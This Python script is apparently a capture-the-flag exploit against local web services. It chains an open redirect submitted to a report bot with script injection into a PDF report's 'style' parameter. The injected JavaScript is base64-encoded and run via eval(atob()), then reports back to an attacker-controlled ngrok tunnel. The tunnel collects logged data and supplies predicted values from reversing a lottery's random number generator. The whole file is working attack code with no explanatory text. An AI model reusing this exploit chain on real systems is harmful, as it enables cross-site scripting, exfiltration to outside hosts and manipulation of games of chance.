from math import floor
from time import sleep
from urllib.parse import quote_plus
import requests
import random
import os
from pyngrok import ngrok
from http.server import HTTPServer, SimpleHTTPRequestHandler, ThreadingHTTPServer
import threading
import base64
import json
from rev import reverse

INTERNAL = "http://localhost:4401"
LOTTERY = "ws://localhost:4402"
WEBSITE = "http://localhost:1337"
LOCAL_PORT = 8000


def main():
    os.chdir(os.path.dirname(os.path.realpath(__file__)))
    tunnel = NgrokServer(LOCAL_PORT)
    our_domain = tunnel.get_domain()
    print(our_domain)
    vin_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    coordinator = AsyncCoordinator()
    
    vin = "".join([random.choice(vin_charset) for _ in range(17)])
    lottery_script = generate_lottery_script(our_domain, LOTTERY, INTERNAL, vin)
    pdf_exploit_url = generate_pdf_exploit_url(our_domain, INTERNAL, vin, lottery_script)
    open_redirect_url = generate_website_open_redirect_url(WEBSITE, pdf_exploit_url)
    r = requests.post(f"{WEBSITE}/report", data={"userUrl": open_redirect_url})
    
    coordinator.wait_until_done()
    tunnel.disconnect()

def generate_lottery_script(our_domain, lottery_url, internal_url, vin):
    with open("lottery.js", "r") as f:
        lottery_js = f.read()
    final_script = lottery_js.replace("ATTACKER_URL", our_domain) \
    .replace("LOTTERY_URL", lottery_url).replace("INTERNAL_URL", internal_url).replace("VIN", vin)
    encoded = base64.b64encode(final_script.encode()).decode()
    final_script = f"""console.log(1);\neval(atob('{encoded}'));""" # needs the first line, dk why
    return final_script

def generate_pdf_exploit_url(our_domain, internal_url, vin, script):
    payload = f"""formal.css"><script>{script}</script><img src='{our_domain}/hang'><link rel="stylesheet" href="formal.css"""
    return f"{internal_url}/download-report?vin={quote_plus(vin)}&style={quote_plus(payload)}&timeout=60000"

def generate_website_open_redirect_url(website_url, target_url):
    return f"{website_url}/redirect?url={quote_plus(target_url)}"

class NgrokServer():
    def __init__(self, port, override_domain=None):
        if override_domain is None:
            self.handle = ngrok.connect(port, host_header="rewrite")
            self.domain = self.handle.public_url
        else:
            self.domain = override_domain
        self.overridden = override_domain is not None
    
    def get_domain(self):
        return self.domain
    
    def disconnect(self):
        if not self.overridden:
            ngrok.disconnect(self.domain)
        self.__del__()


class AsyncCoordinator():
    def __init__(self, *args, **kwargs):
        serv = ThreadingHTTPServer(('localhost', LOCAL_PORT), CoordinatorHandler)
        self.thread = threading.Thread(target=serv.serve_forever)
        self.thread.daemon = True # run async
        self.thread.start()
    
    def wait_until_done(self):
        self.thread.join()
    
headers_with_cors = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type"
}
    
class CoordinatorHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def do_GET(self):
        if self.path.startswith("/poll"):
            pass
        elif self.path.startswith("/hang"):
            sleep(1000000)
            self.send_resp(200, "ok", headers_with_cors)
        else:
            super().do_GET()
        
    def do_POST(self):
        if self.path.startswith("/log"):
            content = self.read_content() 
            print(content)
            self.send_resp(200, "ok", headers_with_cors)
        elif self.path.startswith("/verify"):
            content = self.read_content().decode()
            content = json.loads(content)
            state = content['state']
            for num in state:
                if floor(num) == 228017:
                    print("baka!")
            self.send_resp(200, "ok", headers_with_cors)
        elif self.path.startswith("/compute"):
            content = self.read_content()
            decoded = json.loads(content)
            tgt = decoded['target']
            max = decoded['max']
            nums = decoded['nums'] # we're expecting 100
            nums = [n / max for n in nums]
            res = reverse(nums, tgt, max)
            if res == "UNSAT" or res == "RETRY":
                self.send_resp(200, "-1", headers_with_cors)
            else:
                print("computed!")
                res = floor(600 - res / 50) + 3
                self.send_resp(200, str(res), headers_with_cors)
        else:
            super().do_POST()
        
        
    def do_OPTIONS(self):
        self.send_resp(200, "ok", headers_with_cors)
    
    def read_content(self):
        if 'Content-Length' in self.headers:
            content_length = int(self.headers['Content-Length'])
            return self.rfile.read(content_length)
        else:
            print("[Coordinator] No content length in POST request")
            return ""
    
    def send_resp(self, code, msg, headers={}):
        self.send_response(code)
        for k, v in headers.items():
            self.send_header(k, v)
        self.end_headers()
        if isinstance(msg, str):
            msg = msg.encode()
        self.wfile.write(msg)
            


if __name__ == "__main__":
    main()